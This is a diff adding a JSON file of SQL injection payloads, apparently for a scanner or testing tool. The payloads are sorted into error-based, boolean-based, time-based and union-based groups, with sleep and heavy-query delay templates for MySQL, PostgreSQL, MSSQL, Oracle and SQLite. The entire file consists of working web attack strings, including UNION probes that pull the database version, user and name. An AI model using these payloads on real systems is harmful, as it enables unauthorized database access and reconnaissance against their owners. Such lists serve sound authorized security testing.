@@ -1,0 +1,101 @@
+{
+  "error_based": [
+    "'",
+    "\"",
+    "')",
+    "\")",
+    "'\"",
+    "\"'",
+    "' OR '1'='1",
+    "\" OR \"1\"=\"1",
+    "' OR 1=1--",
+    "\" OR 1=1--",
+    "' OR '1'='1' --",
+    "\" OR \"1\"=\"1\" --",
+    "') OR ('1'='1",
+    "\") OR (\"1\"=\"1",
+    "' UNION SELECT NULL--",
+    "\" UNION SELECT NULL--",
+    "' AND 1=2 UNION SELECT NULL,NULL--",
+    "\" AND 1=2 UNION SELECT NULL,NULL--",
+    "'; SELECT 1--",
+    "\"; SELECT 1--",
+    "' OR SLEEP(5)--",
+    "\" OR SLEEP(5)--",
+    "' WAITFOR DELAY '00:00:05'--",
+    "\" WAITFOR DELAY '00:00:05'--"
+  ],
+  "boolean_based": [
+    "' AND '1'='1",
+    "' AND '1'='2",
+    "\" AND \"1\"=\"1",
+    "\" AND \"1\"=\"2",
+    "' AND 1=1",
+    "' AND 1=2",
+    "\" AND 1=1",
+    "\" AND 1=2",
+    "') AND ('1'='1",
+    "') AND ('1'='2",
+    "\") AND (\"1\"=\"1",
+    "\") AND (\"1\"=\"2",
+    "' AND ASCII(SUBSTRING((SELECT 1),1,1))>48",
+    "\" AND ASCII(SUBSTRING((SELECT 1),1,1))>48",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0",
+    "\" AND (SELECT COUNT(*) FROM information_schema.tables)>0"
+  ],
+  "time_based": [
+    "' OR SLEEP(5)--",
+    "\" OR SLEEP(5)--",
+    "'; WAITFOR DELAY '00:00:05'--",
+    "\"; WAITFOR DELAY '00:00:05'--",
+    "' AND SLEEP(5)--",
+    "\" AND SLEEP(5)--",
+    "') OR SLEEP(5)--",
+    "\") OR SLEEP(5)--",
+    "' OR pg_sleep(5)--",
+    "\" OR pg_sleep(5)--",
+    "'; SELECT pg_sleep(5)--",
+    "\"; SELECT pg_sleep(5)--",
+    "' OR BENCHMARK(5000000,MD5(1))--",
+    "\" OR BENCHMARK(5000000,MD5(1))--"
+  ],
+  "union_based": [
+    "' UNION SELECT NULL--",
+    "\" UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "\" UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "\" UNION SELECT NULL,NULL,NULL--",
+    "' UNION ALL SELECT NULL--",
+    "\" UNION ALL SELECT NULL--",
+    "' UNION ALL SELECT NULL,NULL--",
+    "\" UNION ALL SELECT NULL,NULL--",
+    "' UNION SELECT 1,2,3--",
+    "\" UNION SELECT 1,2,3--",
+    "' UNION SELECT version(),user(),database()--",
+    "\" UNION SELECT version(),user(),database()--",
+    "') UNION SELECT NULL--",
+    "\") UNION SELECT NULL--"
+  ],
+  "mysql_time": [
+    "SLEEP({delay})",
+    "BENCHMARK(5000000,MD5(1))",
+    "SELECT SLEEP({delay})"
+  ],
+  "postgresql_time": [
+    "pg_sleep({delay})",
+    "SELECT pg_sleep({delay})"
+  ],
+  "mssql_time": [
+    "WAITFOR DELAY '00:00:0{delay}'",
+    "WAITFOR TIME '00:00:0{delay}'"
+  ],
+  "oracle_time": [
+    "DBMS_LOCK.SLEEP({delay})",
+    "(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)"
+  ],
+  "sqlite_time": [
+    "randomblob(100000000)",
+    "LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))"
+  ]
+}
